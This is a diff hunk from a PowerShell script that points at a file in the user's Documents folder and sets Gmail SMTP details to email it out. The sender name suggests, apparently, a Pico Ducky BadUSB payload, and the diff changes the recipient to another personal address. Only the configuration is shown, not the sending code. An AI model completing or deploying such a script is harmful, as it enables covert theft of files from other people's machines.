@@ -2,7 +2,7 @@ $UserName = $env:USERNAME
 $Path = "C:\Users\$UserName\Documents\fichier.txt"
 
 $EmailFrom = "picoduckyraspberry@gmail.com"
-$EmailTo = "brochetons@yahoo.com"
+$EmailTo = "clement14bs@icloud.com"
 $Subject = "Fichier envoyé via PowerShell"
 $Body = "Voici le fichier demandé."
 $SMTPServer = "smtp.gmail.com"
